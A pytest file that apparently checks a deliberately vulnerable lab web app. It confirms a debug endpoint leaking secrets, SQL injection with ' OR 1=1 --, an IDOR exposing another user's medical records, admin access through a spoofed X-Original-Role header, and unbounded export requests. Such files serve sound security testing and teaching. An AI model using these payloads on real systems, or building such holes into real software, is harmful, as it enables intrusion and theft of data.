import pytest
import httpx
from httpx import ASGITransport
from app.target.app import app


@pytest.mark.asyncio
async def test_target_health_endpoint():
    transport = ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/v1/health")
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "healthy"


@pytest.mark.asyncio
async def test_target_information_disclosure():
    """Verify that unauthenticated debug endpoint leaks database credentials and secrets."""
    transport = ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/v1/debug/env")
        assert resp.status_code == 200
        data = resp.json()
        assert "DATABASE_URL" in data
        assert "SecretDBPassw0rd!" in data["DATABASE_URL"]
        assert "JWT_SECRET" in data


@pytest.mark.asyncio
async def test_target_sql_injection():
    """Verify that search endpoint exhibits SQL injection behavior."""
    transport = ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Benign search
        resp_clean = await client.get("/api/v1/search?q=StressX")
        assert resp_clean.status_code == 200
        assert resp_clean.json()["results_count"] >= 1

        # 2. Syntax fault via single quote
        resp_err = await client.get("/api/v1/search?q='")
        assert resp_err.status_code == 500
        assert "syntax" in resp_err.text.lower() or "unrecognized token" in resp_err.text.lower()

        # 3. Boolean/logic bypass
        resp_inj = await client.get("/api/v1/search?q=' OR 1=1 --")
        assert resp_inj.status_code == 200
        assert resp_inj.json()["results_count"] == 3


@pytest.mark.asyncio
async def test_target_authentication_and_idor():
    """Verify that a standard user can exploit IDOR to read other users' confidential data."""
    transport = ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Login as standard user alice
        login_resp = await client.post("/api/v1/auth/login", json={"username": "alice", "password": "password123"})
        assert login_resp.status_code == 200
        token = login_resp.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}

        # 2. Alice requests Bob's private profile
        bob_resp = await client.get("/api/v1/users/user_102/profile", headers=headers)
        assert bob_resp.status_code == 200
        bob_data = bob_resp.json()
        assert bob_data["username"] == "bob"
        assert "medical records" in bob_data["confidential_data"]


@pytest.mark.asyncio
async def test_target_privilege_escalation():
    """Verify that spoofing X-Original-Role grants unauthorized admin access."""
    transport = ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        # Unauthenticated request without header -> 403 Forbidden
        denied = await client.get("/api/v1/admin/system-config")
        assert denied.status_code == 403

        # Request with spoofed header -> 200 OK
        allowed = await client.get("/api/v1/admin/system-config", headers={"X-Original-Role": "admin"})
        assert allowed.status_code == 200
        assert allowed.json()["authorized_by"] == "Header-X-Original-Role"


@pytest.mark.asyncio
async def test_target_resource_exhaustion():
    """Verify unbounded parameter handling on export endpoint."""
    transport = ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/v1/reports/export?items=250000")
        assert resp.status_code == 200
        data = resp.json()
        assert data["requested_items"] == 250000
        assert data["status"] == "BATCH_COMPLETE"
